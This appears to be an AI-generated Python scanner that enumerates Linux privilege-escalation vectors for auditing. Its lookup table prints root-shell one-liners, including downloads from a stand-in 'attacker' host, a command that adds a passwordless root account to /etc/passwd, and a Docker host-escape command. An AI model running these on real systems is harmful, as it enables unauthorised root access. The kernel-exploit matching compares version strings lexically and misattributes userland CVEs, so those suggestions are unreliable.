#!/usr/bin/env python3
"""Privilege Escalation Scanner — Linux privesc enumeration — CWE-250, CWE-269.

Automated privilege escalation vector detection:
  1. SUID/SGID binaries — with GTFOBins cross-reference
  2. Capabilities — dangerous Linux capabilities (CAP_SYS_ADMIN, etc.)
  3. Cron jobs — world-writable scripts, PATH hijacking
  4. Sudo configuration — NOPASSWD, wildcards, env_keep
  5. Writable paths — PATH directories, library paths
  6. Kernel version — known exploit suggestions
  7. Docker/LXC — container escape vectors
  8. Sensitive file permissions — /etc/shadow, SSH keys, .bash_history
  9. Network services — listening services running as root
  10. Environment — LD_PRELOAD, LD_LIBRARY_PATH abuse

Usage:
    python privesc_scanner.py --target localhost --mode auto
    python privesc_scanner.py --target 10.10.10.1 --mode suid
    python privesc_scanner.py --mode auto  (scans local system)

⚠️ Contenu généré par IA — validation humaine requise avant utilisation.
"""

from __future__ import annotations

import os
import re
import subprocess
import sys
from pathlib import Path

from lib import Finding, log, parse_base_args, save_findings

# ---------------------------------------------------------------------------
# GTFOBins — SUID binaries exploitable for privesc
# ---------------------------------------------------------------------------

GTFOBINS_SUID: dict[str, str] = {
    "bash": "bash -p",
    "sh": "sh -p",
    "dash": "dash -p",
    "zsh": "zsh",
    "csh": "csh",
    "env": "env /bin/sh -p",
    "find": "find . -exec /bin/sh -p \\; -quit",
    "vim": "vim -c ':!/bin/sh'",
    "vi": "vi -c ':!/bin/sh'",
    "nano": "nano → Ctrl+R → Ctrl+X → /bin/sh",
    "less": "less /etc/passwd → !/bin/sh",
    "more": "more /etc/passwd → !/bin/sh",
    "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
    "nmap": "nmap --interactive → !sh (old versions)",
    "python": "python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
    "python3": "python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
    "perl": "perl -e 'exec \"/bin/sh\";'",
    "ruby": "ruby -e 'exec \"/bin/sh\"'",
    "node": "node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'",
    "php": "php -r 'system(\"/bin/sh -p\");'",
    "lua": "lua -e 'os.execute(\"/bin/sh\")'",
    "cp": "cp /bin/sh /tmp/sh; chmod +s /tmp/sh; /tmp/sh -p",
    "mv": "Overwrite /etc/passwd with modified version",
    "wget": "wget http://attacker/shell -O /tmp/shell; chmod +x /tmp/shell",
    "curl": "curl http://attacker/shell -o /tmp/shell; chmod +x /tmp/shell",
    "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip": "zip /tmp/a.zip /etc/passwd -T -TT '/bin/sh #'",
    "gcc": "gcc -wrapper /bin/sh,-p,-s .",
    "make": "make -s --eval=$'x:\\n\\t-/bin/sh -p'",
    "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "pkexec": "pkexec /bin/sh (CVE-2021-4034 PwnKit)",
    "screen": "screen -x (symlink attack for older versions)",
    "systemctl": "systemctl → !sh",
    "journalctl": "journalctl → !/bin/sh",
    "strace": "strace -o /dev/null /bin/sh -p",
    "ltrace": "ltrace -b -L /bin/sh -p",
    "gdb": "gdb -nx -ex '!sh' -ex quit",
    "mount": "mount -o bind /bin/sh /usr/bin/target",
    "exim": "exim -bh (Exim <= 4.89 RCE)",
    "passwd": "Overwrite /etc/passwd entry",
    "tee": "echo 'root2::0:0:root:/root:/bin/bash' | tee -a /etc/passwd",
    "ed": "ed → !/bin/sh",
}

# Dangerous capabilities
DANGEROUS_CAPS: dict[str, str] = {
    "cap_sys_admin": "Can mount filesystems, load kernel modules — near-root",
    "cap_sys_ptrace": "Can ptrace any process — inject code into root processes",
    "cap_sys_module": "Can load kernel modules — instant root",
    "cap_dac_override": "Can read/write any file regardless of permissions",
    "cap_dac_read_search": "Can read any file — access /etc/shadow",
    "cap_setuid": "Can change UID — become root directly",
    "cap_setgid": "Can change GID — access any group's files",
    "cap_net_raw": "Can craft raw packets — ARP spoofing, network sniffing",
    "cap_net_bind_service": "Can bind to privileged ports (< 1024)",
    "cap_fowner": "Bypass permission checks on file owner",
    "cap_kill": "Can send signals to any process",
    "cap_chown": "Can change file ownership — chown any file",
}


# ---------------------------------------------------------------------------
# Scanning functions
# ---------------------------------------------------------------------------

def _run(cmd: list[str], timeout: int = 15) -> str | None:
    """Run a command and return stdout or None."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout if r.returncode == 0 else None
    except (FileNotFoundError, subprocess.TimeoutExpired, PermissionError):
        return None


def scan_suid(findings: list[Finding]) -> None:
    """Find SUID/SGID binaries and cross-reference GTFOBins."""
    output = _run(["find", "/", "-perm", "-4000", "-type", "f"], timeout=30)
    if not output:
        output = _run(["find", "/usr", "-perm", "-4000", "-type", "f"], timeout=15)

    if not output:
        findings.append(Finding(title="SUID scan failed", severity="info"))
        return

    suid_bins = [l.strip() for l in output.splitlines() if l.strip()]

    exploitable = []
    for binary_path in suid_bins:
        name = Path(binary_path).name
        if name in GTFOBINS_SUID:
            exploitable.append({
                "path": binary_path,
                "exploit": GTFOBINS_SUID[name],
            })

    if exploitable:
        findings.append(Finding(
            title=f"SUID binaries exploitable via GTFOBins: {len(exploitable)}",
            severity="critical",
            cwe="CWE-250",
            evidence={"exploitable": exploitable},
            description="SUID binaries that can be used for privilege escalation",
            steps=[e["exploit"] for e in exploitable[:5]],
        ))

    findings.append(Finding(
        title=f"SUID/SGID binaries: {len(suid_bins)} total",
        severity="medium" if not exploitable else "info",
        cwe="CWE-250",
        evidence={"binaries": suid_bins[:30]},
    ))


def scan_capabilities(findings: list[Finding]) -> None:
    """Check for dangerous Linux capabilities."""
    output = _run(["getcap", "-r", "/"])
    if not output:
        output = _run(["getcap", "-r", "/usr"])

    if not output:
        findings.append(Finding(title="Capability scan skipped (getcap not found)", severity="info"))
        return

    dangerous = []
    all_caps = []
    for line in output.splitlines():
        if not line.strip():
            continue
        all_caps.append(line.strip())
        for cap, desc in DANGEROUS_CAPS.items():
            if cap in line.lower():
                dangerous.append({"binary": line.strip(), "capability": cap, "risk": desc})

    if dangerous:
        findings.append(Finding(
            title=f"Dangerous capabilities: {len(dangerous)} binaries",
            severity="critical",
            cwe="CWE-250",
            evidence={"dangerous": dangerous},
        ))

    findings.append(Finding(
        title=f"Capabilities: {len(all_caps)} binaries",
        severity="info",
        evidence={"capabilities": all_caps[:20]},
    ))


def scan_cron(findings: list[Finding]) -> None:
    """Analyze cron jobs for privesc vectors."""
    cron_dirs = ["/etc/crontab", "/etc/cron.d", "/var/spool/cron/crontabs"]
    issues = []

    # System crontab
    for cron_path in cron_dirs:
        p = Path(cron_path)
        if p.is_file():
            try:
                content = p.read_text()
                for line in content.splitlines():
                    if line.strip() and not line.startswith("#"):
                        # Check if script is world-writable
                        parts = line.split()
                        if len(parts) >= 6:
                            cmd = parts[5] if len(parts) > 5 else ""
                            cmd_path = Path(cmd.split()[0]) if cmd.split() else None
                            if cmd_path and cmd_path.exists():
                                mode = cmd_path.stat().st_mode
                                if mode & 0o002:  # world-writable
                                    issues.append({
                                        "cron": line.strip(),
                                        "script": str(cmd_path),
                                        "issue": "world-writable cron script",
                                    })
            except PermissionError:
                pass
        elif p.is_dir():
            try:
                for f in p.iterdir():
                    if f.is_file():
                        try:
                            content = f.read_text()
                            if "root" in content:
                                issues.append({
                                    "file": str(f),
                                    "issue": "root cron job — check for writable scripts",
                                })
                        except PermissionError:
                            pass
            except PermissionError:
                pass

    if issues:
        findings.append(Finding(
            title=f"Cron job issues: {len(issues)}",
            severity="high",
            cwe="CWE-269",
            evidence={"issues": issues},
        ))


def scan_sudo(findings: list[Finding]) -> None:
    """Analyze sudo configuration."""
    output = _run(["sudo", "-l", "-n"])
    if not output:
        findings.append(Finding(title="sudo -l requires password", severity="info"))
        return

    nopasswd = []
    wildcards = []
    for line in output.splitlines():
        if "NOPASSWD" in line:
            nopasswd.append(line.strip())
        if "*" in line or "?" in line:
            wildcards.append(line.strip())

    if nopasswd:
        findings.append(Finding(
            title=f"Sudo NOPASSWD entries: {len(nopasswd)}",
            severity="critical",
            cwe="CWE-269",
            evidence={"nopasswd": nopasswd},
            description="Commands executable as root without password",
        ))

    if wildcards:
        findings.append(Finding(
            title=f"Sudo wildcard entries: {len(wildcards)}",
            severity="high",
            cwe="CWE-269",
            evidence={"wildcards": wildcards},
            description="Wildcard sudo rules may allow argument injection",
        ))

    findings.append(Finding(
        title="Sudo configuration",
        severity="info",
        evidence={"output": output[:2000]},
    ))


def scan_writable_paths(findings: list[Finding]) -> None:
    """Check for writable directories in PATH and library paths."""
    issues = []

    # Check PATH directories
    for p in os.environ.get("PATH", "").split(":"):
        if p and os.path.isdir(p) and os.access(p, os.W_OK):
            issues.append({"path": p, "type": "PATH", "issue": "writable PATH directory"})

    # Check library paths
    for env in ("LD_LIBRARY_PATH", "LD_PRELOAD"):
        val = os.environ.get(env, "")
        if val:
            issues.append({"env": env, "value": val, "issue": f"{env} is set — possible hijack"})

    # Check /etc/ld.so.conf
    try:
        ldconf = Path("/etc/ld.so.conf").read_text()
        for line in ldconf.splitlines():
            p = line.strip()
            if p and not p.startswith("#") and os.path.isdir(p) and os.access(p, os.W_OK):
                issues.append({"path": p, "type": "ld.so.conf", "issue": "writable library path"})
    except (OSError, PermissionError):
        pass

    if issues:
        findings.append(Finding(
            title=f"Writable path issues: {len(issues)}",
            severity="high",
            cwe="CWE-269",
            evidence={"issues": issues},
        ))


def scan_sensitive_files(findings: list[Finding]) -> None:
    """Check permissions on sensitive files."""
    checks = [
        ("/etc/shadow", "readable", lambda p: os.access(p, os.R_OK), "critical"),
        ("/etc/passwd", "writable", lambda p: os.access(p, os.W_OK), "critical"),
        ("/root/.ssh", "accessible", lambda p: os.access(p, os.R_OK), "high"),
        ("/root/.bash_history", "readable", lambda p: os.access(p, os.R_OK), "high"),
        ("/etc/sudoers", "readable", lambda p: os.access(p, os.R_OK), "high"),
        ("/var/log/auth.log", "readable", lambda p: os.access(p, os.R_OK), "medium"),
    ]

    for path, action, check, severity in checks:
        if os.path.exists(path) and check(path):
            findings.append(Finding(
                title=f"Sensitive file {action}: {path}",
                severity=severity,
                cwe="CWE-200",
                endpoint=path,
            ))


def scan_container(findings: list[Finding]) -> None:
    """Detect container environment and escape vectors."""
    in_container = False
    container_type = "unknown"

    if os.path.exists("/.dockerenv"):
        in_container = True
        container_type = "Docker"
    elif _run(["cat", "/proc/1/cgroup"]):
        cgroup = _run(["cat", "/proc/1/cgroup"]) or ""
        if "docker" in cgroup or "lxc" in cgroup or "kubepods" in cgroup:
            in_container = True
            container_type = "Docker/LXC/Kubernetes"

    if not in_container:
        return

    findings.append(Finding(
        title=f"Running inside {container_type} container",
        severity="medium",
        evidence={"container_type": container_type},
    ))

    # Check for escape vectors
    if os.path.exists("/var/run/docker.sock"):
        findings.append(Finding(
            title="Docker socket mounted in container",
            severity="critical",
            cwe="CWE-269",
            evidence={"path": "/var/run/docker.sock"},
            description="Docker socket access = container escape to host root",
            steps=["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
        ))

    if _run(["fdisk", "-l"]) is not None:
        findings.append(Finding(
            title="Block device access (--privileged detected)",
            severity="critical",
            cwe="CWE-250",
            description="Privileged container — mount host filesystem for escape",
        ))

    # /proc/sysrq-trigger
    if os.path.exists("/proc/sysrq-trigger") and os.access("/proc/sysrq-trigger", os.W_OK):
        findings.append(Finding(
            title="SysRq trigger writable — possible host crash",
            severity="high",
            cwe="CWE-250",
        ))


def scan_kernel(findings: list[Finding]) -> None:
    """Check kernel version for known exploits."""
    output = _run(["uname", "-r"])
    if not output:
        return

    kernel = output.strip()
    findings.append(Finding(
        title=f"Kernel version: {kernel}",
        severity="info",
        evidence={"kernel": kernel},
    ))

    # Known CVE suggestions (simplified)
    known_vulns = [
        ("4.4", "4.13", "CVE-2017-16995 — eBPF verifier bypass"),
        ("5.0", "5.11", "CVE-2021-3156 — Baron Samedit (sudo, not kernel)"),
        ("5.8", "5.16", "CVE-2022-0847 — DirtyPipe"),
        ("2.6", "5.8", "CVE-2021-4034 — PwnKit (pkexec)"),
        ("5.0", "5.10", "CVE-2021-22555 — Netfilter heap OOB"),
    ]

    major_minor = ".".join(kernel.split(".")[:2])
    suggestions = []
    for low, high, cve in known_vulns:
        if low <= major_minor <= high:
            suggestions.append(cve)

    if suggestions:
        findings.append(Finding(
            title=f"Potential kernel exploits: {len(suggestions)}",
            severity="high",
            cwe="CWE-269",
            evidence={"kernel": kernel, "exploits": suggestions},
            description="Kernel version may be vulnerable — verify with exploit-db",
        ))


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def run_privesc_scan(mode: str = "auto") -> list[Finding]:
    """Run privilege escalation scanning."""
    findings: list[Finding] = []

    scan_map = {
        "suid": scan_suid,
        "caps": scan_capabilities,
        "cron": scan_cron,
        "sudo": scan_sudo,
        "paths": scan_writable_paths,
        "files": scan_sensitive_files,
        "container": scan_container,
        "kernel": scan_kernel,
    }

    if mode == "auto":
        for fn in scan_map.values():
            fn(findings)
    elif mode in scan_map:
        scan_map[mode](findings)

    return findings


def main() -> None:
    parser = parse_base_args()
    parser.add_argument("--mode", choices=["auto", "suid", "caps", "cron", "sudo", "paths", "files", "container", "kernel"],
                        default="auto", help="Scan mode")
    args = parser.parse_args()

    log.info("Privilege escalation scanner starting — mode=%s", args.mode)

    findings = run_privesc_scan(mode=args.mode)
    log.info("Scan complete — %d findings", len(findings))

    for f in findings:
        icon = {"critical": "🔴", "high": "🟠", "medium": "🟡"}.get(f.severity, "🔵")
        log.info("  %s [%s] %s", icon, f.severity.upper(), f.title)

    save_findings(findings, "privesc-scanner")


if __name__ == "__main__":
    main()
